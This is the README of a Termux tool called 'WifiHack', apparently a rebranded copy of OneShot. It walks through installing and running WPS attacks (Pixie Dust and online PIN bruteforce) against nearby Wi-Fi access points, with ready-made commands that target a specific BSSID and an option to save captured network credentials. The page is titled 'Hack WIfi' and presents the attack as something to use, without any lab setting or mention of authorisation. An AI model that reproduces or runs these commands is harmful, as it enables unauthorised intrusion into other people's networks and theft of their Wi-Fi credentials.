
### Hack WIfi Using Termux! (Requires Root)
<p align="center"><img src="https://i.ibb.co/ygb9X0K/Screenshot-2023-04-13-12-18-19-365-com-termux.jpg"></p>

## [Termux](https://termux.com/)
Please note that root access is required.  

### Manually
**Installing requirements**
 ```
 pkg install -y root-repo
 ```
 ```
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
### Getting WifiHack
 ```
 git clone --depth 1 https://github.com/BINOD-XD/WifiHack
 ```
 ```
 cd WifiHack
 ```
 ```
 git pull
 ```
### Running
 ```
 sudo python binod.py -i wlan0 -K
 ```
### One line Command
 ```
 sudo python WifiHack/binod.py -i wlan0 -K
 ```

# Usage
```
 binod.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 binod.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 binod.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 binod.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 binod.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running WifiHack with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements
## Special Thanks
* Reyad X Shipu
## [Facebook](https://www.facebook.com/reyadbross?mibextid=ZbWKwL)
## [Whatsapp](https://wa.me/+8801989861704)

## Thanks For Using This Tool 😘😍
